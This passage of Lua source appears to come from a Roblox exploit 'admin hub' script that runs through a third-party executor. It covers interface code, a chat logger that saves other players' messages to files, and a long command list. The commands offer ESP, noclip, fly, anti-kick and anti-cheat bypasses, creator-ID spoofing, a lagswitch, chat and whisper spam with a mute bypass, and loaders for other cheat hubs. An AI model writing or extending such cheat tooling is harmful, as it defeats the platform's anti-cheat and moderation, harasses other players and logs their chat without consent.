	table.insert(shade3,selectChat)
	selectChat.BackgroundColor3 = currentShade3
	selectJoin.BackgroundColor3 = currentShade2
end)

if not writefileExploit() then
	notify('Saves','Your exploit does not support read/write file. Your settings will not save.')
end

ChatLog = function(plr)
	plr.Chatted:Connect(function(Message)
		if logsEnabled == true then
			CreateLabel(plr.Name,Message)
		end
	end)
end

JoinLog = function(plr)
	if jLogsEnabled == true then
		CreateJoinLabel(plr,plr.UserId)
	end
end

SaveChatlogs.MouseButton1Down:Connect(function()
	if writefileExploit() then
		if #scroll_2:GetChildren() > 0 then
			notify("Loading",'Hold on a sec')
			local placeName = game:GetService('MarketplaceService'):GetProductInfo(game.PlaceId).Name
			local writelogs = '-- Admin Hub Chat logs for "'..placeName..'"\n'
			for _, child in pairs(scroll_2:GetChildren()) do
				writelogs = writelogs..'\n'..child.Text
			end
			local writelogsFile = tostring(writelogs)
			local fileext = 0
			local function nameFile()
				local file
				pcall(function() file = readfile(placeName..' Chat Logs ('..fileext..').txt') end)
				if file then
					fileext = fileext+1
					nameFile()
				else
					writefileCooldown(placeName..' Chat Logs ('..fileext..').txt', writelogsFile)
				end
			end
			nameFile()
			notify('Chat Logs','Saved chat logs to the workspace folder within your exploit folder.')
		end
	else
		notify('Chat Logs','Your exploit does not support write file. You cannot save chat logs.')
	end
end)

for _, plr in pairs(Players:GetChildren()) do
	if plr.ClassName == "Player" then
		ChatLog(plr)
	end
end

Players.PlayerRemoving:Connect(function(player)
	if ESPenabled or CHMSenabled or COREGUI:FindFirstChild(player.Name..'_LC') then
		for i,v in pairs(COREGUI:GetChildren()) do
			if v.Name == player.Name..'_ESP' or v.Name == player.Name..'_LC' or v.Name == player.Name..'_CHMS' then
				v:Destroy()
			end
		end
	end
	if viewing ~= nil and player == viewing then
		workspace.CurrentCamera.CameraSubject = Players.LocalPlayer.Character
		viewing = nil
		if viewDied then
			viewDied:Disconnect()
			viewChanged:Disconnect()
		end
		notify('Spectate','View turned off (player left)')
	end
end)

Exit.MouseButton1Down:Connect(function()
	logs:TweenPosition(UDim2.new(0, 0, 1, 10), "InOut", "Quart", 0.3, true, nil)
end)

Hide.MouseButton1Down:Connect(function()
	if logs.Position ~= UDim2.new(0, 0, 1, -20) then
		logs:TweenPosition(UDim2.new(0, 0, 1, -20), "InOut", "Quart", 0.3, true, nil)
	else
		logs:TweenPosition(UDim2.new(0, 0, 1, -265), "InOut", "Quart", 0.3, true, nil)
	end
end)

EventBind.MouseButton1Click:Connect(function()
	eventEditor.Frame:TweenPosition(UDim2.new(0.5,-175,0.5,-101), "InOut", "Quart", 0.5, true, nil)
end)

Keybinds.MouseButton1Click:Connect(function()
	KeybindsFrame:TweenPosition(UDim2.new(0, 0, 0, 0), "InOut", "Quart", 0.5, true, nil)
	wait(0.5)
	SettingsHolder.Visible = false
end)

Close.MouseButton1Click:Connect(function()
	SettingsHolder.Visible = true
	KeybindsFrame:TweenPosition(UDim2.new(0, 0, 0, 175), "InOut", "Quart", 0.5, true, nil)
end)

Keybinds.MouseButton1Click:Connect(function()
	KeybindsFrame:TweenPosition(UDim2.new(0, 0, 0, 0), "InOut", "Quart", 0.5, true, nil)
	wait(0.5)
	SettingsHolder.Visible = false
end)

Add.MouseButton1Click:Connect(function()
	KeybindEditor:TweenPosition(UDim2.new(0.5, -180, 0, 260), "InOut", "Quart", 0.5, true, nil)
end)

Delete.MouseButton1Click:Connect(function()
	binds = {}
	refreshbinds()
	updatesaves()
	notify('Keybinds Updated','Removed all keybinds')
end)

Close_2.MouseButton1Click:Connect(function()
	SettingsHolder.Visible = true
	AliasesFrame:TweenPosition(UDim2.new(0, 0, 0, 175), "InOut", "Quart", 0.5, true, nil)
end)

Aliases.MouseButton1Click:Connect(function()
	AliasesFrame:TweenPosition(UDim2.new(0, 0, 0, 0), "InOut", "Quart", 0.5, true, nil)
	wait(0.5)
	SettingsHolder.Visible = false
end)

Close_3.MouseButton1Click:Connect(function()
	SettingsHolder.Visible = true
	PositionsFrame:TweenPosition(UDim2.new(0, 0, 0, 175), "InOut", "Quart", 0.5, true, nil)
end)

Positions.MouseButton1Click:Connect(function()
	PositionsFrame:TweenPosition(UDim2.new(0, 0, 0, 0), "InOut", "Quart", 0.5, true, nil)
	wait(0.5)
	SettingsHolder.Visible = false
end)

local selectionBox = Instance.new("SelectionBox")
selectionBox.Name = randomString()
selectionBox.Color3 = Color3.new(255,255,255)
selectionBox.Adornee = nil
selectionBox.Parent = PARENT

local selected = Instance.new("SelectionBox")
selected.Name = randomString()
selected.Color3 = Color3.new(0,166,0)
selected.Adornee = nil
selected.Parent = PARENT

local ActivateHighlight = nil
local ClickSelect = nil
function selectPart()
	ToPartFrame:TweenPosition(UDim2.new(0.5, -180, 0, 335), "InOut", "Quart", 0.5, true, nil)
	local function HighlightPart()
		if selected.Adornee ~= IYMouse.Target then
			selectionBox.Adornee = IYMouse.Target
		else
			selectionBox.Adornee = nil
		end
	end
	ActivateHighlight = IYMouse.Move:Connect(HighlightPart)
	local function SelectPart()
		if IYMouse.Target ~= nil then
			selected.Adornee = IYMouse.Target
			Path.Text = getHierarchy(IYMouse.Target)
		end
	end
	ClickSelect = IYMouse.Button1Down:Connect(SelectPart)
end

Part.MouseButton1Click:Connect(function()
	selectPart()
end)

Exit_4.MouseButton1Click:Connect(function()
	ToPartFrame:TweenPosition(UDim2.new(0.5, -180, 0, -500), "InOut", "Quart", 0.5, true, nil)
	if ActivateHighlight then
		ActivateHighlight:Disconnect()
	end
	if ClickSelect then
		ClickSelect:Disconnect()
	end
	selectionBox.Adornee = nil
	selected.Adornee = nil
	Path.Text = ""
end)

CopyPath.MouseButton1Click:Connect(function()
	if Path.Text ~= "" then
		toClipboard(Path.Text)
	else
		notify('Copy Path','Select a part to copy its path')
	end
end)

ChoosePart.MouseButton1Click:Connect(function()
	if Path.Text ~= "" then
		local tpNameExt = ''
		local function handleWpNames()
			local FoundDupe = false
			for i,v in pairs(pWayPoints) do
				if v.NAME:lower() == selected.Adornee.Name:lower()..tpNameExt then
					FoundDupe = true
				end
			end
			if not FoundDupe then
				notify('Modified Waypoints',"Created waypoint: "..selected.Adornee.Name..tpNameExt)
				pWayPoints[#pWayPoints + 1] = {NAME = selected.Adornee.Name..tpNameExt, COORD = {selected.Adornee}}
			else
				if isNumber(tpNameExt) then
					tpNameExt = tpNameExt+1
				else
					tpNameExt = 1
				end
				handleWpNames()
			end
		end
		handleWpNames()
		refreshwaypoints()
	else
		notify('Part Selection','Select a part first')
	end
end)

cmds={}
customAlias = {}
Delete_3.MouseButton1Click:Connect(function()
	customAlias = {}
	aliases = {}
	notify('Aliases Modified','Removed all aliases')
	updatesaves()
	refreshaliases()
end)

PrefixBox:GetPropertyChangedSignal("Text"):Connect(function()
	prefix = PrefixBox.Text
	Cmdbar.PlaceholderText = "Command Bar ("..prefix..")"
	updatesaves()
end)

function CamViewport()
	if workspace.CurrentCamera then
		return workspace.CurrentCamera.ViewportSize.X
	end
end

function UpdateToViewport()
	if Holder.Position.X.Offset < -CamViewport() then
		Holder:TweenPosition(UDim2.new(1, -CamViewport(), Holder.Position.Y.Scale, Holder.Position.Y.Offset), "InOut", "Quart", 0.04, true, nil)
		Notification:TweenPosition(UDim2.new(1, -CamViewport() + 250, Notification.Position.Y.Scale, Notification.Position.Y.Offset), "InOut", "Quart", 0.04, true, nil)
	end
end
CameraChanged = workspace.CurrentCamera:GetPropertyChangedSignal("ViewportSize"):Connect(UpdateToViewport)

function updateCamera(child, parent)
	if parent ~= workspace then
		CamMoved:Disconnect()
		CameraChanged:Disconnect()
		repeat wait() until workspace.CurrentCamera
		CameraChanged = workspace.CurrentCamera:GetPropertyChangedSignal("ViewportSize"):Connect(UpdateToViewport)
		CamMoved = workspace.CurrentCamera.AncestryChanged:Connect(updateCamera)
	end
end
CamMoved = workspace.CurrentCamera.AncestryChanged:Connect(updateCamera)

function dragMain(dragpoint,gui)
	spawn(function()
		local dragging
		local dragInput
		local dragStart = Vector3.new(0,0,0)
		local startPos
		local function update(input)
			local pos = -250
			local delta = input.Position - dragStart
			if startPos.X.Offset + delta.X <= -500 then
				local Position = UDim2.new(1, -250, Notification.Position.Y.Scale, Notification.Position.Y.Offset)
				game:GetService("TweenService"):Create(Notification, TweenInfo.new(.20), {Position = Position}):Play()
				pos = 250
			else
				local Position = UDim2.new(1, -500, Notification.Position.Y.Scale, Notification.Position.Y.Offset)
				game:GetService("TweenService"):Create(Notification, TweenInfo.new(.20), {Position = Position}):Play()
				pos = -250
			end
			if startPos.X.Offset + delta.X <= -250 and -CamViewport() <= startPos.X.Offset + delta.X then
				local Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, gui.Position.Y.Scale, gui.Position.Y.Offset)
				game:GetService("TweenService"):Create(gui, TweenInfo.new(.20), {Position = Position}):Play()
				local Position2 = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X + pos, Notification.Position.Y.Scale, Notification.Position.Y.Offset)
				game:GetService("TweenService"):Create(Notification, TweenInfo.new(.20), {Position = Position2}):Play()
			elseif startPos.X.Offset + delta.X > -500 then
				local Position = UDim2.new(1, -250, gui.Position.Y.Scale, gui.Position.Y.Offset)
				game:GetService("TweenService"):Create(gui, TweenInfo.new(.20), {Position = Position}):Play()
			elseif -CamViewport() > startPos.X.Offset + delta.X then
				gui:TweenPosition(UDim2.new(1, -CamViewport(), gui.Position.Y.Scale, gui.Position.Y.Offset), "InOut", "Quart", 0.04, true, nil)
				local Position = UDim2.new(1, -CamViewport(), gui.Position.Y.Scale, gui.Position.Y.Offset)
				game:GetService("TweenService"):Create(gui, TweenInfo.new(.20), {Position = Position}):Play()
				local Position2 = UDim2.new(1, -CamViewport() + 250, Notification.Position.Y.Scale, Notification.Position.Y.Offset)
				game:GetService("TweenService"):Create(Notification, TweenInfo.new(.20), {Position = Position2}):Play()
			end
		end
		dragpoint.InputBegan:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
				dragging = true
				dragStart = input.Position
				startPos = gui.Position

				input.Changed:Connect(function()
					if input.UserInputState == Enum.UserInputState.End then
						dragging = false
					end
				end)
			end
		end)
		dragpoint.InputChanged:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
				dragInput = input
			end
		end)
		UserInputService.InputChanged:Connect(function(input)
			if input == dragInput and dragging then
				update(input)
			end
		end)
	end)
end

dragMain(Title,Holder)

Match = function(name,str)
	str = str:gsub("%W", "%%%1")
	return name:lower():find(str:lower()) and true
end

local canvasPos = Vector2.new(0,0)
local topCommand = nil
IndexContents = function(str,bool,cmdbar,Ianim)
	local Index,SizeY = 0,0
	local indexnum = 0
	local frame = CMDsF
	topCommand = nil
	local chunks = {}
	if str:sub(#str,#str) == "\\" then str = "" end
	for w in string.gmatch(str,"[^\\]+") do
		table.insert(chunks,w)
	end
	if #chunks > 0 then str = chunks[#chunks] end
	if str:sub(1,1) == "!" then str = str:sub(2) end
	for i,v in next, frame:GetChildren() do
		if bool then
			if Match(v.Text,str) then
				indexnum = indexnum + 1
				Index = Index + 1
				v.Visible = true
				v:TweenPosition(UDim2.new(0,10,0,Index*v.AbsoluteSize.Y-v.AbsoluteSize.Y), "InOut", "Quart", 0.2, true, nil)
				SizeY = SizeY + v.AbsoluteSize.Y
				frame.CanvasSize = UDim2.new(0,0,0,SizeY)
				if topCommand == nil then
					topCommand = v.Text
				end
			else
				v.Visible = false
			end
		else
			v.Visible = true
			SizeY = SizeY + v.AbsoluteSize.Y
			frame.CanvasSize = UDim2.new(0,0,0,SizeY)
			if topCommand == nil then
				topCommand = v.Text
			end
		end
	end
	if not Ianim then
		if indexnum == 0 or string.find(str, " ") then
			if not cmdbar then
				minimizeHolder()
			elseif cmdbar then
				cmdbarHolder()
			end
		else
			maximizeHolder()
		end
	else
		minimizeHolder()
	end
end

PlayerGui = Players.LocalPlayer:FindFirstChildOfClass("PlayerGui")
local chatbox
spawn(function()
	if pcall(function() chatbox = PlayerGui:WaitForChild("Chat").Frame.ChatBarParentFrame.Frame.BoxFrame.Frame.ChatBar end) then	
		local function chatboxFocused()
			canvasPos = CMDsF.CanvasPosition
		end
		local chatboxFocusedC = chatbox.Focused:Connect(chatboxFocused)

		local function Index()
			if chatbox.Text:lower():sub(1,1) == prefix then
				if SettingsOpen == true then
					wait(0.2)
					CMDsF.Visible = true
					Settings:TweenPosition(UDim2.new(0, 0, 0, 220), "InOut", "Quart", 0.2, true, nil)
				end
				IndexContents(PlayerGui.Chat.Frame.ChatBarParentFrame.Frame.BoxFrame.Frame.ChatBar.Text:lower():sub(2),true)
			else
				minimizeHolder()
				if SettingsOpen == true then
					wait(0.2)
					Settings:TweenPosition(UDim2.new(0, 0, 0, 45), "InOut", "Quart", 0.2, true, nil)
					CMDsF.Visible = false
				end
			end
		end
		local chatboxFunc = chatbox:GetPropertyChangedSignal("Text"):Connect(Index)

		function chatboxFocusLost(enterpressed)
			if not enterpressed or chatbox.Text:lower():sub(1,1) ~= prefix then
				IndexContents('',true)
			end
			CMDsF.CanvasPosition = canvasPos
			minimizeHolder()
		end
		local chatboxFocusLostC = chatbox.FocusLost:Connect(chatboxFocusLost)

		PlayerGui:WaitForChild("Chat").Frame.ChatBarParentFrame.ChildAdded:Connect(function(newbar)
			wait()
			if newbar:FindFirstChild('BoxFrame') then
				chatbox = PlayerGui:WaitForChild("Chat").Frame.ChatBarParentFrame.Frame.BoxFrame.Frame.ChatBar
				if chatboxFocusedC then chatboxFocusedC:Disconnect() end
				chatboxFocusedC = chatbox.Focused:Connect(chatboxFocused)
				if chatboxFunc then chatboxFunc:Disconnect() end
				chatboxFunc = chatbox:GetPropertyChangedSignal("Text"):Connect(Index)
				if chatboxFocusLostC then chatboxFocusLostC:Disconnect() end
				chatboxFocusLostC = chatbox.FocusLost:Connect(chatboxFocusLost)
			end
		end)
		--else
		--print('Custom chat detected. Will not provide suggestions for commands typed in the chat.')
	end
end)

function autoComplete(str,curText)
	local endingChar = {"[", "/", "(", " "}
	local stop = 0
	for i=1,#str do
		local c = str:sub(i,i)
		if table.find(endingChar, c) then
			stop = i
			break
		end
	end
	curText = curText or Cmdbar.Text
	local subPos = 0
	local pos = 1
	local findRes = string.find(curText,"\\",pos)
	while findRes do
		subPos = findRes
		pos = findRes+1
		findRes = string.find(curText,"\\",pos)
	end
	if curText:sub(subPos+1,subPos+1) == "!" then subPos = subPos + 1 end
	Cmdbar.Text = curText:sub(1,subPos) .. str:sub(1, stop - 1)..' '
	wait()
	Cmdbar.Text = Cmdbar.Text:gsub( '\t', '' )
	Cmdbar.CursorPosition = #Cmdbar.Text+1--1020
end

CMDs = {}
CMDs[#CMDs + 1] = {NAME = 'damage', DESC = 'Loads old Roblox console'}
CMDs[#CMDs + 1] = {NAME = 'explorer / dex', DESC = 'Opens DEX explorer'}
CMDs[#CMDs + 1] = {NAME = 'remotespy / rspy', DESC = 'Opens FrostHook Spy'}
CMDs[#CMDs + 1] = {NAME = 'audiologger / alogger', DESC = 'Opens Edges audio logger'}
CMDs[#CMDs + 1] = {NAME = 'antitimestop / ats', DESC = 'Does what it sounds like'}
CMDs[#CMDs + 1] = {NAME = 'jobid', DESC = 'Copies the games JobId to your clipboard'}
CMDs[#CMDs + 1] = {NAME = 'notifyjobid', DESC = 'Notifies you the games JobId'}
CMDs[#CMDs + 1] = {NAME = 'rejoin / rj', DESC = 'Makes you rejoin the game'}
CMDs[#CMDs + 1] = {NAME = 'autorejoin / autorj', DESC = 'Automatically rejoins the if you get kicked/disconnected'}
CMDs[#CMDs + 1] = {NAME = 'serverhop / shop', DESC = 'Teleports you to a different server'}
CMDs[#CMDs + 1] = {NAME = 'joinplayer [username / ID] [place ID]', DESC = 'Joins a specific players server'}
CMDs[#CMDs + 1] = {NAME = 'gameteleport / gametp [place ID]', DESC = 'Joins a game by ID'}
CMDs[#CMDs + 1] = {NAME = 'antiidle / antiafk', DESC = 'Prevents the game from kicking you for being idle/afk'}
CMDs[#CMDs + 1] = {NAME = 'datalimit [num]', DESC = 'Set outgoing KBPS limit'}
CMDs[#CMDs + 1] = {NAME = 'replicationlag / backtrack [num]', DESC = 'Set IncommingReplicationLag'}
CMDs[#CMDs + 1] = {NAME = 'creatorid / creator', DESC = 'Notifies you the creators ID'}
CMDs[#CMDs + 1] = {NAME = 'copycreatorid / copycreator', DESC = 'Copies the creators ID to your clipboard'}
CMDs[#CMDs + 1] = {NAME = 'setcreatorid / setcreator', DESC = 'Sets your userid to the creators ID'}
CMDs[#CMDs + 1] = {NAME = 'noprompts', DESC = 'Prevents the game from showing you purchase/premium prompts'}
CMDs[#CMDs + 1] = {NAME = 'showprompts', DESC = 'Allows the game to show purchase/premium prompts again'}
CMDs[#CMDs + 1] = {NAME = 'enable [inventory/playerlist/chat/all]', DESC = 'Toggles visibility of coregui items'}
CMDs[#CMDs + 1] = {NAME = 'disable [inventory/playerlist/chat/all]', DESC = 'Toggles visibility of coregui items'}
CMDs[#CMDs + 1] = {NAME = 'showguis', DESC = 'Shows any invisible GUIs'}
CMDs[#CMDs + 1] = {NAME = 'unshowguis', DESC = 'Undoes showguis'}
CMDs[#CMDs + 1] = {NAME = 'hideguis', DESC = 'Hides any GUIs in PlayerGui'}
CMDs[#CMDs + 1] = {NAME = 'unhideguis', DESC = 'Undoes hideguis'}
CMDs[#CMDs + 1] = {NAME = 'hide', DESC = 'Hides the main IY GUI'}
CMDs[#CMDs + 1] = {NAME = 'show', DESC = 'Shows IY again'}
CMDs[#CMDs + 1] = {NAME = 'savegame / saveplace', DESC = 'Uses saveinstance to save the game'}
CMDs[#CMDs + 1] = {NAME = 'clearerror', DESC = 'Clears the annoying box and blur when a game kicks you'}
CMDs[#CMDs + 1] = {NAME = 'clientantikick / antikick (CLIENT)', DESC = 'Prevents localscripts from kicking you'}
CMDs[#CMDs + 1] = {NAME = 'clientantiteleport / antiteleport (CLIENT)', DESC = 'Prevents localscripts from teleporting you'}
CMDs[#CMDs + 1] = {NAME = 'allowrejoin / allowrj [true/false] (CLIENT)', DESC = 'Changes if antiteleport allows you to rejoin or not'}
CMDs[#CMDs + 1] = {NAME = 'volume / vol [0-10]', DESC = 'Adjusts your game volume on a scale of 0 to 10'}
CMDs[#CMDs + 1] = {NAME = 'antilag / al', DESC = 'Lowers game quality to boost FPS'}
CMDs[#CMDs + 1] = {NAME = 'fpscap [num / none]', DESC = 'Caps FPS'}
CMDs[#CMDs + 1] = {NAME = 'notify [text]', DESC = 'Sends you a notification with the provided text'}
CMDs[#CMDs + 1] = {NAME = 'lastcommand / lastcmd', DESC = 'Executes the previous command used'}
CMDs[#CMDs + 1] = {NAME = 'exit', DESC = 'Kills roblox process'}
CMDs[#CMDs + 1] = {NAME = 'nc / noclip', DESC = 'Go through objects'}
CMDs[#CMDs + 1] = {NAME = 'clip / c', DESC = 'Disables noclip'}
CMDs[#CMDs + 1] = {NAME = 'fly', DESC = 'Makes you fly'}
CMDs[#CMDs + 1] = {NAME = 'unfly', DESC = 'Disables fly'}
CMDs[#CMDs + 1] = {NAME = 'fs [num]', DESC = 'Set fly speed (default is 20)'}
CMDs[#CMDs + 1] = {NAME = 'vehiclefly / vfly', DESC = 'Makes you fly in a vehicle'}
CMDs[#CMDs + 1] = {NAME = 'unvehiclefly / unvfly', DESC = 'Disables vehicle fly'}
CMDs[#CMDs + 1] = {NAME = 'vehicleflyspeed  / vflyspeed [num]', DESC = 'Set vehicle fly speed'}
CMDs[#CMDs + 1] = {NAME = 'qefly [true / false]', DESC = 'enables or disables the Q and E hotkeys for fly'}
CMDs[#CMDs + 1] = {NAME = 'vehiclenoclip / vnoclip', DESC = 'Turns off vehicle collision'}
CMDs[#CMDs + 1] = {NAME = 'vehicleclip / vclip / unvnoclip', DESC = 'Enables vehicle collision'}
CMDs[#CMDs + 1] = {NAME = 'float /  platform', DESC = 'Spawns a platform beneath you causing you to float'}
CMDs[#CMDs + 1] = {NAME = 'unfloat / noplatform', DESC = 'Removes the platform'}
CMDs[#CMDs + 1] = {NAME = 'swim', DESC = 'Allows you to swim in the air'}
CMDs[#CMDs + 1] = {NAME = 'unswim / noswim', DESC = 'Stops you from swimming everywhere'}
CMDs[#CMDs + 1] = {NAME = 'm / swp [name]', DESC = 'Sets a waypoint at your position'}
CMDs[#CMDs + 1] = {NAME = 'waypoint / wpp [name] [X Y Z]', DESC = 'Sets a waypoint with specified coordinates'}
CMDs[#CMDs + 1] = {NAME = 's / showwp', DESC = 'Shows all currently set waypoints'}
CMDs[#CMDs + 1] = {NAME = 'hidewaypoints / hidemarks / h', DESC = 'Hides shown waypoints'}
CMDs[#CMDs + 1] = {NAME = '/ [name]', DESC = 'Teleports player to a waypoint'}
CMDs[#CMDs + 1] = {NAME = 'tweenwaypoint / twp [name]', DESC = 'Tweens player to a waypoint'}
CMDs[#CMDs + 1] = {NAME = 'deletewaypoint / d [name]', DESC = 'Deletes a waypoint'}
CMDs[#CMDs + 1] = {NAME = 'clearwaypoints / cwp', DESC = 'Clears all waypoints'}
CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
CMDs[#CMDs + 1] = {NAME = 'tp / to [plr]', DESC = 'Go to a player'}
CMDs[#CMDs + 1] = {NAME = 'tweengoto / tgoto [plr]', DESC = 'Tween to a player (bypasses some anti cheats)'}
CMDs[#CMDs + 1] = {NAME = 'tweenspeed / tspeed [num]', DESC = 'Sets how fast all tween commands go (default is 1)'}
CMDs[#CMDs + 1] = {NAME = 'vehiclegoto / vgoto [plr]', DESC = 'Go to a player while in a vehicle'}
CMDs[#CMDs + 1] = {NAME = 'loopgoto [plr] [distance] [delay]', DESC = 'Loop teleport to a player'}
CMDs[#CMDs + 1] = {NAME = 'unloopgoto [plr]', DESC = 'Stops teleporting you to a player'}
CMDs[#CMDs + 1] = {NAME = 'clientbring / cbring [plr] (CLIENT)', DESC = 'Bring a player'}
CMDs[#CMDs + 1] = {NAME = 'loopbring [plr] [distance] [delay] (CLIENT)', DESC = 'Loop brings a player to you (useful for killing)'}
CMDs[#CMDs + 1] = {NAME = 'unloopbring [plr]', DESC = 'Undoes loopbring'}
CMDs[#CMDs + 1] = {NAME = 'freeze / fr [plr] (CLIENT)', DESC = 'Freezes a player'}
CMDs[#CMDs + 1] = {NAME = 'thaw / unfr [plr] (CLIENT)', DESC = 'Unfreezes a player'}
CMDs[#CMDs + 1] = {NAME = 'owlhub / oh ', DESC = 'load owlhub'}
CMDs[#CMDs + 1] = {NAME = 'tweentpposition / ttppos [X Y Z]', DESC = 'Tween to coordinates (bypasses some anti cheats)'}
CMDs[#CMDs + 1] = {NAME = 'offset [X Y Z]', DESC = 'Offsets you by certain coordinates'}
CMDs[#CMDs + 1] = {NAME = 'tweenoffset / toffset [X Y Z]', DESC = 'Tween offset (bypasses some anti cheats)'}
CMDs[#CMDs + 1] = {NAME = 'notifyposition / notifypos [plr]', DESC = 'Notifies you the coordinates of a character'}
CMDs[#CMDs + 1] = {NAME = 'copyposition / copypos [plr]', DESC = 'Copies the coordinates of a character to your clipboard'}
CMDs[#CMDs + 1] = {NAME = 'lagswitch / ls', DESC = 'Activates a lagswitch press q'}
CMDs[#CMDs + 1] = {NAME = 'spawnpoint / spawn [delay]', DESC = 'Sets a position where you will spawn'}
CMDs[#CMDs + 1] = {NAME = 'nospawnpoint / nospawn', DESC = 'Removes your custom spawn point'}
CMDs[#CMDs + 1] = {NAME = 'flashback / diedtp', DESC = 'Teleports you to where you last died'}
CMDs[#CMDs + 1] = {NAME = 'walltp', DESC = 'Teleports you above/over any wall you run into'}
CMDs[#CMDs + 1] = {NAME = 'nowalltp / unwalltp', DESC = 'Disables walltp'}
CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
CMDs[#CMDs + 1] = {NAME = 'logs', DESC = 'Opens the logs GUI'}
CMDs[#CMDs + 1] = {NAME = 'chatlogs / clogs', DESC = 'Log what people say or whisper'}
CMDs[#CMDs + 1] = {NAME = 'joinlogs / jlogs', DESC = 'Log when people join'}
CMDs[#CMDs + 1] = {NAME = 'zyrexhub / zh', DESC = 'Loads Zyrex Hub)'}
CMDs[#CMDs + 1] = {NAME = 'spam [text]', DESC = 'Makes you spam the chat'}
CMDs[#CMDs + 1] = {NAME = 'shotgun', DESC = 'Give Prison Life Shotgun'}
CMDs[#CMDs + 1] = {NAME = 'whisper / pm [plr] [text]', DESC = 'Makes you whisper a string to someone (possible mute bypass)'}
CMDs[#CMDs + 1] = {NAME = 'guns', DESC = 'Makes you spam a players whispers'}
CMDs[#CMDs + 1] = {NAME = 'unpmspam [plr]', DESC = 'Turns off pm spam'}
CMDs[#CMDs + 1] = {NAME = 'ak', DESC = 'Gives Prison life ak'}
CMDs[#CMDs + 1] = {NAME = 'bubblechat (CLIENT)', DESC = 'Enables bubble chat for your client'}
CMDs[#CMDs + 1] = {NAME = 'unbubblechat / nobubblechat', DESC = 'Disables the bubblechat command'}
CMDs[#CMDs + 1] = {NAME = 'safechat', DESC = 'Enables safe chat'}
CMDs[#CMDs + 1] = {NAME = 'nosafechat / disablesafechat', DESC = 'Disables safechat'}
CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
CMDs[#CMDs + 1] = {NAME = 'esp', DESC = 'View all players and their status'}
CMDs[#CMDs + 1] = {NAME = 'noesp / unesp', DESC = 'Removes esp'}
CMDs[#CMDs + 1] = {NAME = 'partesp [part name]', DESC = 'Highlights a part'}
CMDs[#CMDs + 1] = {NAME = 'unpartesp / nopartesp [part name]', DESC = 'removes partesp'}
CMDs[#CMDs + 1] = {NAME = 'chams', DESC = 'ESP but without text in the way'}
CMDs[#CMDs + 1] = {NAME = 'nochams / unchams', DESC = 'Removes chams'}
CMDs[#CMDs + 1] = {NAME = 'locate [plr]', DESC = 'View a single player and their status'}
CMDs[#CMDs + 1] = {NAME = 'unlocate / nolocate [plr]', DESC = 'Removes locate'}
CMDs[#CMDs + 1] = {NAME = 'xray', DESC = 'Makes all parts in workspace transparent'}
CMDs[#CMDs + 1] = {NAME = 'unxray / noxray', DESC = 'Restores transparency'}
CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
CMDs[#CMDs + 1] = {NAME = 'spectate / view [plr]', DESC = 'View a player'}
CMDs[#CMDs + 1] = {NAME = 'viewpart / viewp [part name]', DESC = 'View a part'}
CMDs[#CMDs + 1] = {NAME = 'unspectate / unview', DESC = 'Stops viewing player'}
CMDs[#CMDs + 1] = {NAME = 'freecam / fc', DESC = 'Allows you to freely move camera around the game'}
CMDs[#CMDs + 1] = {NAME = 'freecampos / fcpos [X Y Z]', DESC = 'Moves / opens freecam in a certain position'}
CMDs[#CMDs + 1] = {NAME = 'freecamwaypoint / fcwp [name]', DESC = 'Moves / opens freecam to a waypoint'}
CMDs[#CMDs + 1] = {NAME = 'freecamgoto / fcgoto / fctp [plr]', DESC = 'Moves / opens freecam to a player'}
CMDs[#CMDs + 1] = {NAME = 'unfreecam / unfc', DESC = 'Disables freecam'}
CMDs[#CMDs + 1] = {NAME = 'freecamspeed / fcspeed [num]', DESC = 'Adjusts freecam speed (default is 1)'}
CMDs[#CMDs + 1] = {NAME = 'gotocamera / gotocam', DESC = 'Teleports you to the location of your camera'}
CMDs[#CMDs + 1] = {NAME = 'tweengotocam / tgotocam', DESC = 'Tweens you to the location of your camera'}
CMDs[#CMDs + 1] = {NAME = 'firstp', DESC = 'Forces camera to go into first person'}
CMDs[#CMDs + 1] = {NAME = 'thirdp', DESC = 'Allows camera to go into third person'}
CMDs[#CMDs + 1] = {NAME = 'noclipcam / nccam', DESC = 'Allows camera to go through objects like walls'}
CMDs[#CMDs + 1] = {NAME = 'maxzoom [num]', DESC = 'Maximum camera zoom'}
CMDs[#CMDs + 1] = {NAME = 'minzoom [num]', DESC = 'Minimum camera zoom'}
CMDs[#CMDs + 1] = {NAME = 'fov [num]', DESC = 'Adjusts field of view (default is 70)'}
CMDs[#CMDs + 1] = {NAME = 'fixcam / restorecam', DESC = 'Fixes camera'}
CMDs[#CMDs + 1] = {NAME = 'enableshiftlock / enablesl', DESC = 'Enables the shift lock option'}
CMDs[#CMDs + 1] = {NAME = 'lookat [plr]', DESC = 'Moves your camera view to a player'}
CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
CMDs[#CMDs + 1] = {NAME = 'btools / bt (CLIENT)', DESC = 'Gives you building tools (DOES NOT REPLICATE)'}
CMDs[#CMDs + 1] = {NAME = 'f3x (CLIENT)', DESC = 'Gives you F3X building tools (DOES NOT REPLICATE)'}
CMDs[#CMDs + 1] = {NAME = 'partname / partpath', DESC = 'Allows you to click a part to see its path & name'}
CMDs[#CMDs + 1] = {NAME = 'delete [instance name] (CLIENT)', DESC = 'Removes any part with a certain name from the workspace (DOES NOT REPLICATE)'}
CMDs[#CMDs + 1] = {NAME = 'deleteclass / dc [class name] (CLIENT)', DESC = 'Removes any part with a certain classname from the workspace (DOES NOT REPLICATE)'}
CMDs[#CMDs + 1] = {NAME = 'RTX / HighGFX', DESC = 'Shows A Gui With Higher Graphics Card Options'}
CMDs[#CMDs + 1] = {NAME = 'Antifling / af', DESC = 'Stops Others From Using Fling Scripts Against You'}
CMDs[#CMDs + 1] = {NAME = 'invisibleparts / invisparts (CLIENT)', DESC = 'Shows invisible parts'}
CMDs[#CMDs + 1] = {NAME = 'uninvisibleparts / uninvisparts (CLIENT)', DESC = 'Makes parts affected by invisparts return to normal'}
CMDs[#CMDs + 1] = {NAME = 'deleteinvisparts / dip (CLIENT)', DESC = 'Deletes invisible parts'}
CMDs[#CMDs + 1] = {NAME = 'gotopart [part name]', DESC = 'Moves your character to a part or multiple parts'}
